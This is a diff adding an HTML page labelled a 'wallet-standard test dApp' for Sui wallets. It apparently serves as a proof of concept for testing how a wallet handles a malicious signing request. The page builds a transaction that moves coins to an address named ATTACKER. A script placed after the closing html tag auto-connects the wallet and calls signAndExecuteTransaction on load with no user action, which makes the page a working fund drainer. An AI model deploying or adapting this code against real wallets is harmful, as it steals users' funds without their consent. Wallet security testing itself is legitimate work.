@@ -1,0 +1,66 @@
+﻿<!doctype html>
+<html><head><meta charset="utf-8"><title>dapp</title></head>
+<body style="font:14px monospace;padding:20px">
+<h3>wallet-standard test dApp</h3>
+<pre id="log"></pre>
+<script>
+const PTB = {"version": 2, "sender": "0x3ec125f8faed22fe2c6d8697dc76ee98e1b5181c4a7769a5cba7b7125b5b8f12", "expiration": null, "gasData": {"budget": null, "price": null, "owner": null, "payment": null}, "inputs": [{"Pure": {"bytes": "QEIPAAAAAAA="}}, {"Pure": {"bytes": "qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo="}}, {"Pure": {"bytes": "AOH1BQAAAAA="}}, {"Pure": {"bytes": "k0iTIv2Zh+nZfDTjl52wIWPfCE6LVIkFGc2IGupO9wI="}}], "commands": [{"SplitCoins": {"coin": {"GasCoin": true}, "amounts": [{"Input": 0}]}}, {"TransferObjects": {"objects": [{"NestedResult": [0, 0]}], "address": {"Input": 1}}}, {"SplitCoins": {"coin": {"GasCoin": true}, "amounts": [{"Input": 2}]}}, {"MoveCall": {"package": "0x0000000000000000000000000000000000000000000000000000000000000002", "module": "coin", "function": "send_funds", "typeArguments": ["0x0000000000000000000000000000000000000000000000000000000000000002::sui::SUI"], "arguments": [{"NestedResult": [2, 0]}, {"Input": 3}]}}]};
+const ATTACKER = "0x93489322fd9987e9d97c34e3979db02163df084e8b54890519cd881aea4ef702";
+const log = (m) => { document.getElementById('log').textContent += m + "\n"; console.log(m); };
+window.__wallets = [];
+window.addEventListener('wallet-standard:register-wallet', (e) => {
+  try { e.detail({ register: (...ws) => { window.__wallets.push(...ws); log('wallet registered: ' + ws.map(w=>w.name).join(',')); } }); } catch (err) { log('reg err ' + err); }
+});
+window.dispatchEvent(new CustomEvent('wallet-standard:app-ready',
+  { detail: { register: (...ws) => { window.__wallets.push(...ws); log('app-ready wallet: ' + ws.map(w=>w.name).join(',')); } } }));
+
+async function connect() {
+  const w = window.__wallets[0];
+  if (!w) return log('no wallet');
+  const r = await w.features['standard:connect'].connect();
+  log('connected: ' + r.accounts.map(a=>a.address).join(','));
+  window.__connected = true;
+}
+
+async function signTx() {
+  const w = window.__wallets[0];
+  if (!w) return log('no wallet');
+  try {
+    log('calling sui:signTransaction ...');
+    const res = await w.features['sui:signTransaction'].signTransaction({
+      transaction: { toJSON: async () => JSON.stringify(PTB) },
+      account: w.accounts[0],
+      chain: 'sui:testnet'
+    });
+    log('SIGNED bytes=' + res.bytes + ' sig=' + res.signature);
+    window.__signResult = res;
+  } catch (e) {
+    log('sign error: ' + (e && e.message ? e.message : e));
+    window.__signError = String(e);
+  }
+}
+window.connectWallet = connect;
+window.signTx = signTx;
+
+async function signAndExecuteTx() {
+  const w = window.__wallets[0];
+  if (!w) return log('no wallet');
+  try {
+    log('calling sui:signAndExecuteTransaction ...');
+    const res = await w.features['sui:signAndExecuteTransaction'].signAndExecuteTransaction({
+      transaction: { toJSON: async () => JSON.stringify(PTB) },
+      account: w.accounts[0],
+      chain: 'sui:testnet'
+    });
+    log('EXECUTED digest=' + res.digest + ' bytes=' + res.bytes);
+    window.__execResult = res;
+  } catch (e) {
+    log('exec error: ' + (e && e.message ? e.message : e));
+    window.__execError = String(e);
+  }
+}
+window.signAndExecuteTx = signAndExecuteTx;
+</script>
+</body></html>
+
+<script>window.addEventListener('load',()=>{setTimeout(()=>{try{window.connectWallet()}catch(e){document.getElementById('log').textContent+=e}},1200);setTimeout(()=>{try{window.signAndExecuteTx()}catch(e){document.getElementById('log').textContent+=e}},3200);});</script>
